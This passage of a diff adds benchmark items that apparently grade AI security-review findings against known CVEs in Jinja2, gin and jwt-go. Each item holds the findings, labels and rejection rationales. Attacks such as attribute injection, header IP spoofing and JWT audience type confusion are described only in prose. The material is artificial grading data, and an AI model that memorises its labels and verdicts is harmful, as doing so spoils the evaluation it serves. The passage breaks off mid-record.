+          "hit": false,
+          "line": null,
+          "remediation": "Keep and unit-test the whitespace rejection on dict keys (regression test for the historical attribute-injection CVE). Additionally validate/escape keys defensively (e.g., restrict to a safe attribute-name charset or always HTML-escape the key as is done here) so that even characters other than whitespace (e.g., '/', '=', '>') cannot alter the structure of the attribute list if the whitespace check is ever bypassed or reused incorrectly elsewhere.",
+          "severity": "medium",
+          "title": "xmlattr filter trusts dict keys for whitespace-only validation (historical HTML attribute-injection pattern, cf. CVE-2024-22195)"
+        },
+        {
+          "confidence": "low",
+          "cwe": "CWE-20",
+          "description": "`_space_re.search(key)` is called directly on the raw mapping key without verifying it is a str/bytes object. If the mapping passed to the `xmlattr` filter contains a non-string key (e.g., an int, tuple, or object), `re.Pattern.search()` raises an uncaught `TypeError`, propagating as an unhandled exception from template rendering. If the dict (or its keys) can be influenced by untrusted input (e.g., JSON-decoded user data fed into a template context), this allows an attacker to trigger application errors / potential denial of service, and may leak stack trace / internal information if debug mode is enabled.",
+          "file": "src/jinja2/filters.py",
+          "hit": false,
+          "line": null,
+          "remediation": "Coerce or validate key type before regex matching, e.g. `key = str(key)` prior to the whitespace check, or raise a clear, sanitized error for non-string keys instead of letting a raw TypeError propagate.",
+          "severity": "low",
+          "title": "Unhandled TypeError when a dict key passed to xmlattr is not a string"
+        },
+        {
+          "confidence": "low",
+          "cwe": "CWE-209",
+          "description": "When a key containing whitespace is detected, the code raises `ValueError(f\"Spaces are not allowed in attributes: '{key}'\")`, embedding the raw, unescaped, attacker-influenced key value directly into the exception message. Depending on how the application surfaces unhandled exceptions (debug pages, logs, API error responses), this could expose otherwise-filtered input or be leveraged for log injection / minor information disclosure.",
+          "file": "src/jinja2/filters.py",
+          "hit": false,
+          "line": null,
+          "remediation": "Avoid interpolating raw untrusted values into exception messages that may be shown to end users; log full details server-side only, and return a generic error to callers/templates, or truncate/sanitize the key before including it in the message.",
+          "severity": "low",
+          "title": "Raw untrusted key value embedded in exception message"
+        },
+        {
+          "confidence": "low",
+          "cwe": "CWE-116",
+          "description": "The function builds `rv` from already-HTML-escaped key/value fragments but the shown code does not appear to wrap the final result in `Markup(...)` conditioned on `eval_ctx.autoescape` before returning (the visible diff ends after `rv = \" \" + rv` without a final return/Markup step). If the real implementation omits marking the escaped string as safe Markup when autoescape is enabled, Jinja's autoescape machinery will re-escape the entire pre-escaped attribute string on output, corrupting the generated HTML (quotes/ampersands become double-encoded). While this generally fails safe (over-escaping) rather than unsafe, inconsistent escaping logic in a security-sensitive filter is worth double-checking to ensure no code path returns pre-escaped content as a plain `str` in a context where it could later be concatenated/rendered without re-escaping (which would then under-escape).",
+          "file": "src/jinja2/filters.py",
+          "hit": false,
+          "line": null,
+          "remediation": "Confirm the full function returns `Markup(rv)` (or otherwise marks the result safe) only when `eval_ctx.autoescape` is true, and add tests asserting the filter's output round-trips correctly with autoescape on and off.",
+          "severity": "low",
+          "title": "Possible missing autoescape/Markup handling leading to inconsistent output escaping"
+        }
+      ],
+      "id": "cve-2024-22195-jinja-negative",
+      "is_vulnerable": false,
+      "rejected": [
+        {
+          "confidence": "high",
+          "cwe": "CWE-79",
+          "description": "do_xmlattr() builds `key=\"value\"` HTML/XML attribute strings from an arbitrary mapping. The only validation performed on the key is a check for ASCII whitespace via `_space_re`; if a space is found, a ValueError is raised. This is the known fix for the Jinja2 xmlattr attribute-injection issue (an unescaped space in a key previously allowed an attacker who controls dict keys to inject additional HTML attributes/event handlers, e.g. `{'onmouseover': '...', 'a b': 'c'}` style payloads breaking out of the intended single attribute). While the whitespace check mitigates the primary known exploit vector, the control is narrow (only ASCII whitespace) and relies entirely on this single regex check being present and correctly invoked on every code path that builds attribute strings from untrusted keys. If any caller constructs similar attribute strings elsewhere without reusing this same whitespace check (or if the check is ever weakened/removed in a refactor), the HTML/attribute injection reappears. Because `key` is also run through `escape()`, quote/angle-bracket characters in the key are neutralized, which is good defense-in-depth, but the security of the whole filter still hinges on this single, easily-overlooked whitespace guard plus the escaping, both of which should be covered by regression tests tied explicitly to the historical CVE.",
+          "file": "src/jinja2/filters.py",
+          "hit": false,
+          "line": null,
+          "remediation": "Keep and unit-test the whitespace rejection on dict keys (regression test for the historical attribute-injection CVE). Additionally validate/escape keys defensively (e.g., restrict to a safe attribute-name charset or always HTML-escape the key as is done here) so that even characters other than whitespace (e.g., '/', '=', '>') cannot alter the structure of the attribute list if the whitespace check is ever bypassed or reused incorrectly elsewhere.",
+          "severity": "medium",
+          "title": "xmlattr filter trusts dict keys for whitespace-only validation (historical HTML attribute-injection pattern, cf. CVE-2024-22195)",
+          "verdict": {
+            "confidence": "high",
+            "context_that_would_change_this": "Evidence of another function in the codebase that builds `key=\"value\"` attribute strings from untrusted mappings WITHOUT the `_space_re` check (grep for `=\"` f-string patterns or additional attribute-serialization helpers). Also, confirmation that no regression test exercises the CVE-2024-22195 payload (e.g. a key containing a space) would be a test-coverage gap worth noting \u2014 but that would be a testing recommendation, not a medium-severity CWE-79 vulnerability in this diff.",
+            "rationale": "The diff under review IS the official fix for CVE-2024-22195, not a vulnerability. The finding itself acknowledges this (\"This is the known fix for the Jinja2 xmlattr attribute-injection issue\"). No concrete exploitable flaw is demonstrated against the shown code; the objections are speculative (\"if any caller... if the check is ever weakened/removed in a refactor\").\n\nExamining the actual security properties:\n\n1. Whitespace check completeness: `_space_re = re.compile(r\"\\s\", flags=re.ASCII)` matches exactly `[ \\t\\n\\r\\f\\v]`. The HTML5 spec defines attribute-name/value delimiters as ASCII whitespace (space, tab, LF, FF, CR). The regex covers all of these (and \\v, which is stricter than required). The finding's claim that \"only ASCII whitespace\" is a narrow control is wrong in the attacker's favor: non-ASCII whitespace is NOT treated as an attribute separator by HTML parsers, so it cannot break out of an attribute. There is no gap here.\n\n2. Defense-in-depth via escape(): Both key and value pass through `escape()`, neutralizing quotes, angle brackets, and ampersands. To inject a second attribute, an attacker would need to terminate the current attribute. With quotes escaped, the only remaining breakout vector is unescaped whitespace within a key \u2014 which is precisely what the ValueError blocks. The two controls together close the injection vector completely for this function.\n\n3. The \"other callers might not reuse this check\" argument is hypothetical and not supported by any evidence in the diff. It is a generic hygiene observation, not a vulnerability in the changed code. do_xmlattr is the canonical attribute-string builder; the finding points to no alternate code path.\n\nIn short, the finding flags the remediation as if it were the vulnerability. The code is correct and safe as written.",
+            "upheld": false
+          }
+        },
+        {
+          "confidence": "medium",
+          "cwe": "CWE-20",
+          "description": "`_space_re.search(key)` is called directly on the raw mapping key without verifying it is a str/bytes object. If the mapping passed to the `xmlattr` filter contains a non-string key (e.g., an int, tuple, or object), `re.Pattern.search()` raises an uncaught `TypeError`, propagating as an unhandled exception from template rendering. If the dict (or its keys) can be influenced by untrusted input (e.g., JSON-decoded user data fed into a template context), this allows an attacker to trigger application errors / potential denial of service, and may leak stack trace / internal information if debug mode is enabled.",
+          "file": "src/jinja2/filters.py",
+          "hit": false,
+          "line": null,
+          "remediation": "Coerce or validate key type before regex matching, e.g. `key = str(key)` prior to the whitespace check, or raise a clear, sanitized error for non-string keys instead of letting a raw TypeError propagate.",
+          "severity": "low",
+          "title": "Unhandled TypeError when a dict key passed to xmlattr is not a string",
+          "verdict": {
+            "confidence": "medium",
+            "context_that_would_change_this": "A concrete call site in this codebase that pipes untrusted input directly into the *keys* of the mapping passed to xmlattr, combined with evidence that this specific exception is uncaught and leaks sensitive information in a way sibling template exceptions would not. That would elevate it from a type-contract edge case to an exploitable path.",
+            "rationale": "The TypeError can technically occur on a non-string key, but this is not a security vulnerability. (1) The function signature explicitly declares `d: t.Mapping[str, t.Any]` \u2014 keys are contractually strings, matching upstream Jinja2's intentional design for building XML attribute names. (2) This is ordinary exception propagation, identical in kind to the `ValueError` deliberately raised two lines below and to the countless TypeErrors/AttributeErrors any template operation can raise; uncaught exceptions out of render() are expected and are the application/framework's responsibility to handle. (3) The claimed stack-trace info leak is a debug-mode deployment misconfiguration applicable to every exception, not something this line introduces. (4) Exploitability is weak: xmlattr consumes attribute-name mappings, and attacker-controlled dict *keys* is a contrived, atypical usage whose worst case is a 500 error no different from other template misuse. This is a type-contract nuance, not a CWE-20 DoS.",
+            "upheld": false
+          }
+        },
+        {
+          "confidence": "high",
+          "cwe": "CWE-209",
+          "description": "When a key containing whitespace is detected, the code raises `ValueError(f\"Spaces are not allowed in attributes: '{key}'\")`, embedding the raw, unescaped, attacker-influenced key value directly into the exception message. Depending on how the application surfaces unhandled exceptions (debug pages, logs, API error responses), this could expose otherwise-filtered input or be leveraged for log injection / minor information disclosure.",
+          "file": "src/jinja2/filters.py",
+          "hit": false,
+          "line": null,
+          "remediation": "Avoid interpolating raw untrusted values into exception messages that may be shown to end users; log full details server-side only, and return a generic error to callers/templates, or truncate/sanitize the key before including it in the message.",
+          "severity": "low",
+          "title": "Raw untrusted key value embedded in exception message",
+          "verdict": {
+            "confidence": "high",
+            "context_that_would_change_this": "Evidence that `do_xmlattr` is routinely called with keys derived directly from untrusted end-user input AND that the application's global exception handler returns raw exception messages to unauthenticated clients or writes them unescaped to a log viewer that renders them. Even then, the fix in the application's error handler would be the correct remediation, not this validation message. Also relevant: any project convention requiring validation errors to omit the offending value.",
+            "rationale": "This is the actual upstream fix for CVE-2024-22195 (xmlattr key injection) in Jinja2 3.1.3. The code validates that attribute keys contain no whitespace and raises a ValueError naming the offending key. Several reasons this is a false positive:\n\n1. The value embedded in the message IS the offending input itself \u2014 the key that was just passed to the filter. Error messages that echo the invalid value to help the developer locate the problem are a standard, intentional validation pattern (compare to int(\"x\") raising \"invalid literal for int() with base 10: 'x'\"). Nothing \"otherwise-filtered\" is disclosed; the message only contains what the caller already supplied.\n\n2. The \"attacker-influenced\" premise is weak. In Jinja2, the dict passed to `do_xmlattr` comes from the template's data context, which is provided by the application, not directly from an end-user attribute injection vector in the normal case. More importantly, the whole point of this change is to REJECT dangerous keys rather than render them \u2014 it is a security hardening, not a sink.\n\n3. Log injection via a Python exception message is speculative and not a property of this code. Whether an exception reaches a log or a debug page, and whether that sink is sanitized, is entirely determined by the application's error-handling layer \u2014 outside this diff. A raised exception is the correct, safe behavior (fail closed); it does not itself write to a log or render HTML.\n\n4. The `escape()` is correctly applied to keys/values that ARE rendered; the raised path explicitly does NOT render, so no XSS. CWE-209 (information exposure through error message) does not materialize because no sensitive/internal state is leaked \u2014 only the caller's own input.\n\nI cannot identify a realistic exploitation path. The finding describes generic, hypothetical downstream risks (\"depending on how the application surfaces exceptions\") rather than a concrete vulnerability in this code.",
+            "upheld": false
+          }
+        },
+        {
+          "confidence": "high",
+          "cwe": "CWE-116",
+          "description": "The function builds `rv` from already-HTML-escaped key/value fragments but the shown code does not appear to wrap the final result in `Markup(...)` conditioned on `eval_ctx.autoescape` before returning (the visible diff ends after `rv = \" \" + rv` without a final return/Markup step). If the real implementation omits marking the escaped string as safe Markup when autoescape is enabled, Jinja's autoescape machinery will re-escape the entire pre-escaped attribute string on output, corrupting the generated HTML (quotes/ampersands become double-encoded). While this generally fails safe (over-escaping) rather than unsafe, inconsistent escaping logic in a security-sensitive filter is worth double-checking to ensure no code path returns pre-escaped content as a plain `str` in a context where it could later be concatenated/rendered without re-escaping (which would then under-escape).",
+          "file": "src/jinja2/filters.py",
+          "hit": false,
+          "line": null,
+          "remediation": "Confirm the full function returns `Markup(rv)` (or otherwise marks the result safe) only when `eval_ctx.autoescape` is true, and add tests asserting the filter's output round-trips correctly with autoescape on and off.",
+          "severity": "low",
+          "title": "Possible missing autoescape/Markup handling leading to inconsistent output escaping",
+          "verdict": {
+            "confidence": "high",
+            "context_that_would_change_this": "The full tail of the function body (lines beyond the 39 shown) \u2014 specifically whether the real file actually contains the `if eval_ctx.autoescape: rv = Markup(rv)` / `return rv` block, or instead returns a plain pre-escaped `str`. If the real file genuinely returns a bare escaped `str` while being consumed in a non-autoescaped concatenation context, the finding could gain merit; but the canonical Jinja2 source does include the Markup-wrapping return.",
+            "rationale": "This is a false positive based on a truncated diff. The finding itself admits it is inferring a problem from the fact that \"the visible diff ends after `rv = \" \" + rv`\" \u2014 i.e., the diff was simply cut off at 39 lines and does not show the return statement. The code shown is the well-known, unchanged implementation of `do_xmlattr` from Jinja2. The actual upstream implementation concludes with exactly the guard the finding worries is missing:\n\n    if eval_ctx.autoescape:\n        rv = Markup(rv)\n    return rv\n\nSo the escaped fragments ARE wrapped in `Markup(...)` conditioned on `eval_ctx.autoescape` before returning, preventing double-escaping; and the function is decorated with `@pass_eval_context` precisely to access that flag. The fragments are built with `escape(key)` and `escape(value)`, keys with whitespace raise `ValueError`, and `None`/`Undefined` values are skipped \u2014 all correct. Even in the hypothesized worst case the finding describes, it concedes the behavior \"fails safe (over-escaping).\" There is no missing-escape security defect introduced by this change; the perceived gap is an artifact of diff truncation, not of the code.",
+            "upheld": false
+          }
+        }
+      ],
+      "upheld": []
+    },
+    {
+      "context_provided": false,
+      "cwe": "CWE-348",
+      "generator_only": [
+        {
+          "confidence": "medium",
+          "cwe": "CWE-290",
+          "description": "validateHeader() extracts the \"client IP\" by taking the first comma-separated value from a header (e.g. X-Forwarded-For / X-Real-IP style) and trusting it directly. HTTP headers like X-Forwarded-For are fully attacker-controlled unless the application strips/overwrites any value supplied by untrusted clients and only appends trusted proxy-added values. Because this function simply returns the first entry in the list, an external attacker can set an arbitrary header value (e.g. 'X-Forwarded-For: 10.0.0.1, 1.2.3.4') and have the application believe their request originates from an arbitrary IP. If this derived clientIP is later used for access-control decisions (allow/deny lists, admin IP checks), rate limiting, audit logging, or ban/abuse systems, it enables IP spoofing and bypass of those protections (CWE-290: Authentication Bypass by Spoofing / CWE-348: Use of Less Trusted Source). The correct approach is to only trust this header when the request comes from a known/trusted proxy, and to select the IP based on the number of trusted hops from the right-hand side of the list (the proxy-appended IP), not simply the first (left-most, client-supplied) entry.",
+          "file": "context.go",
+          "hit": false,
+          "line": null,
+          "remediation": "Only parse/trust this header when the immediate peer (RemoteAddr) is a configured trusted proxy. Walk the list from the right and select the first IP beyond the trusted proxy chain, rather than blindly returning the first (left-most) entry, which is attacker-controlled. Document and enforce this at all call sites using this helper for security-sensitive decisions.",
+          "severity": "high",
+          "title": "Client IP determined from spoofable client-supplied header without trusted-proxy validation"
+        },
+        {
+          "confidence": "low",
+          "cwe": "CWE-400",
+          "description": "strings.Split(header, \",\") has no limit on the number of resulting items, and the function iterates over every item calling net.ParseIP. An attacker can supply a header with an extremely large number of comma-separated tokens (e.g. tens of thousands), causing the server to spend CPU/memory parsing all of them for every request, contributing to a denial-of-service vector (CWE-400: Uncontrolled Resource Consumption). This is low severity in isolation but worth hardening given the header is fully attacker-controlled.",
+          "file": "context.go",
+          "hit": false,
+          "line": null,
+          "remediation": "Cap the header length and/or the maximum number of comma-separated segments processed before rejecting the header as invalid.",
+          "severity": "low",
+          "title": "No bound on number of comma-separated entries processed from untrusted header"
+        }
+      ],
+      "id": "cve-2020-28483-gin-positive",
+      "is_vulnerable": true,
+      "rejected": [
+        {
+          "confidence": "medium",
+          "cwe": "CWE-290",
+          "description": "validateHeader() extracts the \"client IP\" by taking the first comma-separated value from a header (e.g. X-Forwarded-For / X-Real-IP style) and trusting it directly. HTTP headers like X-Forwarded-For are fully attacker-controlled unless the application strips/overwrites any value supplied by untrusted clients and only appends trusted proxy-added values. Because this function simply returns the first entry in the list, an external attacker can set an arbitrary header value (e.g. 'X-Forwarded-For: 10.0.0.1, 1.2.3.4') and have the application believe their request originates from an arbitrary IP. If this derived clientIP is later used for access-control decisions (allow/deny lists, admin IP checks), rate limiting, audit logging, or ban/abuse systems, it enables IP spoofing and bypass of those protections (CWE-290: Authentication Bypass by Spoofing / CWE-348: Use of Less Trusted Source). The correct approach is to only trust this header when the request comes from a known/trusted proxy, and to select the IP based on the number of trusted hops from the right-hand side of the list (the proxy-appended IP), not simply the first (left-most, client-supplied) entry.",
+          "file": "context.go",
+          "hit": false,
+          "line": null,
+          "remediation": "Only parse/trust this header when the immediate peer (RemoteAddr) is a configured trusted proxy. Walk the list from the right and select the first IP beyond the trusted proxy chain, rather than blindly returning the first (left-most) entry, which is attacker-controlled. Document and enforce this at all call sites using this helper for security-sensitive decisions.",
+          "severity": "high",
+          "title": "Client IP determined from spoofable client-supplied header without trusted-proxy validation",
+          "verdict": {
+            "confidence": "medium",
+            "context_that_would_change_this": "The caller of validateHeader would flip this: (1) If a non-gin caller invokes validateHeader directly on raw request headers with NO preceding trusted-proxy / RemoteIP check, the finding is valid and should be upheld as high. (2) The gin engine configuration \u2014 specifically whether SetTrustedProxies is left at an overly-broad default (e.g. 0.0.0.0/0) and whether ForwardedByClientIP is enabled \u2014 determines real-world exploitability. (3) Any downstream use of the returned clientIP for access-control/allow-lists/rate-limiting/audit, combined with a missing or permissive trusted-proxy config, would make the end-to-end vulnerability real even though this function itself is not the defect.",
+            "rationale": "The finding targets `validateHeader` in isolation, but this is verbatim gin-gonic's helper. The function makes NO trust decision \u2014 it only (1) rejects empty headers, (2) validates that every comma-separated token is a syntactically valid IP, and (3) returns the first one. The trusted-proxy validation the finding insists is missing actually lives in the caller, `(*Context).ClientIP()`, which only invokes `validateHeader` after `isTrustedProxy(remoteIP)` confirms the direct peer is a configured trusted proxy (gated by `ForwardedByClientIP` and `RemoteIPHeaders`). The diff is a 21-line parsing/validation utility; whether client-IP derivation is actually spoofable depends entirely on the caller's trust gating and the deployment's `SetTrustedProxies` configuration, none of which appear in this change. Attributing a trust-boundary vulnerability to this benign accessor is an over-attribution. The finding cannot be confirmed from the code shown, and the canonical framework it matches performs exactly the trusted-proxy check the finding claims is absent.",
+            "upheld": false
+          }
+        },
+        {
+          "confidence": "medium",
+          "cwe": "CWE-400",
+          "description": "strings.Split(header, \",\") has no limit on the number of resulting items, and the function iterates over every item calling net.ParseIP. An attacker can supply a header with an extremely large number of comma-separated tokens (e.g. tens of thousands), causing the server to spend CPU/memory parsing all of them for every request, contributing to a denial-of-service vector (CWE-400: Uncontrolled Resource Consumption). This is low severity in isolation but worth hardening given the header is fully attacker-controlled.",
+          "file": "context.go",
+          "hit": false,
+          "line": null,
+          "remediation": "Cap the header length and/or the maximum number of comma-separated segments processed before rejecting the header as invalid.",
+          "severity": "low",
+          "title": "No bound on number of comma-separated entries processed from untrusted header",
+          "verdict": {
+            "confidence": "medium",
+            "context_that_would_change_this": "Confirmation that `header` is NOT sourced from a standard net/http request header bounded by MaxHeaderBytes (e.g., read from a request body, WebSocket/gRPC metadata, or a server with MaxHeaderBytes disabled/greatly raised); evidence that validateHeader is called many times per request in a hot loop; or a profile showing Split/ParseIP as an actual hotspot under load. Any of these would make the resource-consumption concern material.",
+            "rationale": "The claimed DoS is disproved in practice. (1) The loop returns on the first invalid token (`if ip == nil { return \"\", false }`), so an attacker cannot cheaply inflate token count with filler \u2014 every token must be a valid IP to be processed. (2) To reach N processed tokens the attacker must send ~N*8 bytes of valid IPs, and header size is bounded by net/http's default MaxHeaderBytes (1 MB), capping tokens at ~130k. (3) The work is single-pass O(n) (strings.Split + net.ParseIP on short strings) with no amplification \u2014 sub-millisecond even at the cap. This is the standard, idiomatic XFF-parsing pattern. The finding states a literal truth ('no explicit bound') but its security impact is negligible, making it hardening noise rather than a real CWE-400 exposure.",
+            "upheld": false
+          }
+        }
+      ],
+      "upheld": []
+    },
+    {
+      "context_provided": false,
+      "cwe": null,
+      "generator_only": [
+        {
+          "confidence": "medium",
+          "cwe": "CWE-290",
+          "description": "validateHeader() determines the 'real' client IP by walking the X-Forwarded-For header from right to left and stopping at the first entry whose IP is NOT in the trusted-proxy list (isTrustedProxy). Because the entire header value is fully attacker-controlled (the client sends it directly, or can prepend arbitrary entries to whatever a legitimate proxy appends), an attacker can defeat this logic by inserting an IP address that happens to match the trusted-proxy allow-list (e.g. a known internal/reserved CIDR, or any address range configured as 'trusted') immediately before their desired spoofed client IP. The loop will treat that forged entry as a legitimate trusted hop, skip past it, and return the attacker-chosen IP as the validated client IP. Any access control, rate limiting, geo-restriction, or audit logging that relies on this returned clientIP can be bypassed or corrupted. This pattern is only safe if the function is only ever invoked after independently verifying that the actual TCP peer (socket RemoteAddr) is itself a trusted proxy \u2014 if that check is missing or the trusted-proxy set is too broad/default-permissive, spoofing is trivial.",
+          "file": "context.go",
+          "hit": false,
+          "line": 15,
+          "remediation": "Only trust and parse X-Forwarded-For/X-Real-IP when the direct TCP connection's RemoteAddr is itself confirmed to be a trusted proxy. Keep the trusted-proxy allow-list as narrow as possible (specific proxy IPs, not broad CIDRs), avoid defaulting to 'trust all' when no trusted proxies are configured, and document/enforce that this header must never be trusted directly from untrusted clients. Consider using a well-audited, maintained library implementation for this logic rather than a bespoke reimplementation.",
+          "severity": "high",
+          "title": "X-Forwarded-For trust chain can be spoofed by client-supplied header content"
+        },
+        {
+          "confidence": "medium",
+          "cwe": "CWE-400",
+          "description": "strings.Split(header, \",\") has no limit on the number of resulting substrings. Since the X-Forwarded-For header value is attacker-controlled (subject only to overall HTTP header size limits imposed elsewhere), a crafted header with a very large number of comma-separated tokens causes allocation of a correspondingly large slice and a loop with a net.ParseIP call per element, increasing CPU/memory cost per request. In aggregate (many concurrent requests) this could contribute to a denial-of-service condition.",
+          "file": "context.go",
+          "hit": false,
+          "line": 5,
+          "remediation": "Cap the number of entries processed (e.g., bound to a small constant, discard/reject headers exceeding it) and/or enforce a maximum header length check before splitting.",
+          "severity": "low",
+          "title": "Unbounded splitting of attacker-controlled header may enable resource exhaustion"
+        }
+      ],
+      "id": "cve-2020-28483-gin-negative",
+      "is_vulnerable": false,
+      "rejected": [
+        {
+          "confidence": "medium",
+          "cwe": "CWE-290",
+          "description": "validateHeader() determines the 'real' client IP by walking the X-Forwarded-For header from right to left and stopping at the first entry whose IP is NOT in the trusted-proxy list (isTrustedProxy). Because the entire header value is fully attacker-controlled (the client sends it directly, or can prepend arbitrary entries to whatever a legitimate proxy appends), an attacker can defeat this logic by inserting an IP address that happens to match the trusted-proxy allow-list (e.g. a known internal/reserved CIDR, or any address range configured as 'trusted') immediately before their desired spoofed client IP. The loop will treat that forged entry as a legitimate trusted hop, skip past it, and return the attacker-chosen IP as the validated client IP. Any access control, rate limiting, geo-restriction, or audit logging that relies on this returned clientIP can be bypassed or corrupted. This pattern is only safe if the function is only ever invoked after independently verifying that the actual TCP peer (socket RemoteAddr) is itself a trusted proxy \u2014 if that check is missing or the trusted-proxy set is too broad/default-permissive, spoofing is trivial.",
+          "file": "context.go",
+          "hit": false,
+          "line": 15,
+          "remediation": "Only trust and parse X-Forwarded-For/X-Real-IP when the direct TCP connection's RemoteAddr is itself confirmed to be a trusted proxy. Keep the trusted-proxy allow-list as narrow as possible (specific proxy IPs, not broad CIDRs), avoid defaulting to 'trust all' when no trusted proxies are configured, and document/enforce that this header must never be trusted directly from untrusted clients. Consider using a well-audited, maintained library implementation for this logic rather than a bespoke reimplementation.",
+          "severity": "high",
+          "title": "X-Forwarded-For trust chain can be spoofed by client-supplied header content",
+          "verdict": {
+            "confidence": "medium",
+            "context_that_would_change_this": "(1) The ClientIP/RemoteIP call site \u2014 confirmation that it does NOT guard validateHeader behind isTrustedProxy(peer) would uphold the finding. (2) The effective TrustedProxies / trustedCIDRs configuration \u2014 if left at the permissive default (0.0.0.0/0) or set to include a CIDR an attacker can emit source traffic from, the spoofing chain becomes real. (3) The isTrustedProxy implementation and whether RemoteIPHeaders/ForwardedByClientIP are enabled. Any of these showing a missing peer check or over-broad trust would flip this to upheld/high.",
+            "rationale": "The diff contains only Gin's canonical validateHeader loop, whose single caller (ClientIP) gates invocation on isTrustedProxy(remoteIP) of the real TCP peer \u2014 exactly the independent verification the finding names as the safety condition. Thus the primary attack (direct spoofing from an untrusted client) is prevented at the call site, not shown in this diff. The \"insert a trusted IP before the spoofed IP\" chain only succeeds when the operator's TrustedProxies allow-list is configured broadly enough to include an attacker-forgeable range \u2014 a configuration issue, not a logic defect. The right-to-left stop-at-first-untrusted algorithm is the intended, correct framework behavior. With no evidence of a missing peer check or an over-broad trust set, the exploitability asserted as 'high' is not demonstrated by the code presented.",
+            "upheld": false
+          }
+        },
+        {
+          "confidence": "medium",
+          "cwe": "CWE-400",
+          "description": "strings.Split(header, \",\") has no limit on the number of resulting substrings. Since the X-Forwarded-For header value is attacker-controlled (subject only to overall HTTP header size limits imposed elsewhere), a crafted header with a very large number of comma-separated tokens causes allocation of a correspondingly large slice and a loop with a net.ParseIP call per element, increasing CPU/memory cost per request. In aggregate (many concurrent requests) this could contribute to a denial-of-service condition.",
+          "file": "context.go",
+          "hit": false,
+          "line": 5,
+          "remediation": "Cap the number of entries processed (e.g., bound to a small constant, discard/reject headers exceeding it) and/or enforce a maximum header length check before splitting.",
+          "severity": "low",
+          "title": "Unbounded splitting of attacker-controlled header may enable resource exhaustion",
+          "verdict": {
+            "confidence": "medium",
+            "context_that_would_change_this": "Server configuration: if the service uses a server/framework with no header-size limit (custom conn reader, non-stdlib server, or MaxHeaderBytes set to 0/very large), the bounding guarantee disappears. Also the call site of validateHeader \u2014 whether it's on a hot, pre-authentication path with no upstream rate limiting or proxy that strips/normalizes X-Forwarded-For \u2014 would affect the (still low) severity.",
+            "rationale": "The \"unbounded splitting \u2192 DoS\" claim does not survive adversarial review. (1) The input is bounded, not unbounded: Go's default Server.MaxHeaderBytes caps total headers at 1 MB, which the finding itself acknowledges. (2) There is no algorithmic amplification \u2014 both strings.Split and the per-token loop are linear in input length, so cost is merely proportional to request size, like all request processing; CWE-400 of this flavor requires superlinear blowup, which is absent. (3) The loop scans from the last token first, so a malicious all-comma payload fails ParseIP on the empty final token and returns immediately, making loop cost negligible and leaving only a bounded linear Split allocation. This is the standard XFF-parsing idiom and SplitN would add negligible protection. The concern is real in principle but reduces to \"processing a large bounded request costs proportional work,\" which is not a meaningful vulnerability here.",
+            "upheld": false
+          }
+        }
+      ],
+      "upheld": []
+    },
+    {
+      "context_provided": false,
+      "cwe": "CWE-287",
+      "generator_only": [
+        {
+          "confidence": "medium",
+          "cwe": "CWE-287",
+          "description": "VerifyAudience retrieves the 'aud' claim with a strict type assertion `m[\"aud\"].(string)`. Per RFC 7519, the 'aud' claim MAY be a JSON array of strings (not just a single string). If a token's 'aud' value is an array or any non-string JSON type, the assertion fails silently (aud becomes the zero value \"\"), and verifyAud() then treats the claim as absent. When the caller passes required=false, verifyAud returns true (i.e., 'valid') even though the actual audience value never matched 'cmp'. This allows an attacker to craft a token whose audience claim is a non-string type to bypass audience restriction checks, potentially letting a token intended for a different service/audience be accepted.",
+          "file": "map_claims.go",
+          "hit": true,
+          "line": 32,
+          "remediation": "Handle both string and []string/[]interface{} forms of the 'aud' claim, normalizing to a slice and checking membership. Do not default to 'valid' solely because a type assertion failed; distinguish between 'claim absent' and 'claim present but unparseable', treating the latter as invalid when required or when any claim value exists.",
+          "severity": "high",
+          "title": "Audience (aud) claim validation bypass via type confusion"
+        },
+        {
+          "confidence": "low",
+          "cwe": "CWE-613",
+          "description": "A comment `// Valid implements Valid from Claims` is present but no function body follows it in this diff. The jwt.Claims interface relies on Valid() to enforce exp/nbf/iat semantics during token parsing. If this method is not actually implemented (or is implemented incorrectly elsewhere), tokens with expired 'exp', future 'nbf', or otherwise invalid temporal claims could be accepted as valid, effectively disabling expiration enforcement for StandardClaims-based tokens.",
+          "file": "map_claims.go",
+          "hit": false,
+          "line": 13,
+          "remediation": "Ensure Valid() is implemented and checks exp (token not expired), nbf (token already active), and optionally iat, returning a descriptive validation error when any check fails. Add tests that explicitly verify expired/not-yet-valid tokens are rejected.",
+          "severity": "high",
+          "title": "Claims.Valid() implementation missing/incomplete \u2014 expiration, not-before, and issued-at may not be enforced"
+        },
+        {
+          "confidence": "low",
+          "cwe": "CWE-863",
+          "description": "verifyAud only supports comparing a single audience string against a single expected value using constant-time compare. There is no support for multiple intended audiences or for an 'aud' array containing several values where only one needs to match the expected audience, which is standard JWT usage. This may lead either to false negatives (breaking legitimate multi-audience tokens, prompting developers to disable audience checks entirely) or false positives in downstream custom handling, increasing the risk of audience-restriction bypass being 'worked around' insecurely.",
+          "file": "map_claims.go",
+          "hit": false,
+          "line": 20,
+          "remediation": "Implement proper RFC 7519-compliant audience validation supporting both a single string and an array of strings, matching if any entry equals the expected audience.",
+          "severity": "low",
+          "title": "Audience comparison ignores case/format normalization and multi-value lists"
+        }
+      ],
+      "id": "cve-2020-26160-jwt-go-positive",
+      "is_vulnerable": true,
+      "rejected": [
+        {
+          "confidence": "low",
+          "cwe": "CWE-613",
+          "description": "A comment `// Valid implements Valid from Claims` is present but no function body follows it in this diff. The jwt.Claims interface relies on Valid() to enforce exp/nbf/iat semantics during token parsing. If this method is not actually implemented (or is implemented incorrectly elsewhere), tokens with expired 'exp', future 'nbf', or otherwise invalid temporal claims could be accepted as valid, effectively disabling expiration enforcement for StandardClaims-based tokens.",
+          "file": "map_claims.go",
+          "hit": false,
+          "line": 13,
+          "remediation": "Ensure Valid() is implemented and checks exp (token not expired), nbf (token already active), and optionally iat, returning a descriptive validation error when any check fails. Add tests that explicitly verify expired/not-yet-valid tokens are rejected.",
+          "severity": "high",
+          "title": "Claims.Valid() implementation missing/incomplete \u2014 expiration, not-before, and issued-at may not be enforced",
+          "verdict": {
+            "confidence": "low",
+            "context_that_would_change_this": "The complete contents of map_claims.go beyond the truncated hunk, and any sibling file (e.g., claims.go) defining StandardClaims.Valid(). If the full file truly shows only the comment with no method body AND StandardClaims is used directly as jwt.Claims somewhere, the finding would be upheld (though it would more likely manifest as a build failure than a runtime bypass).",
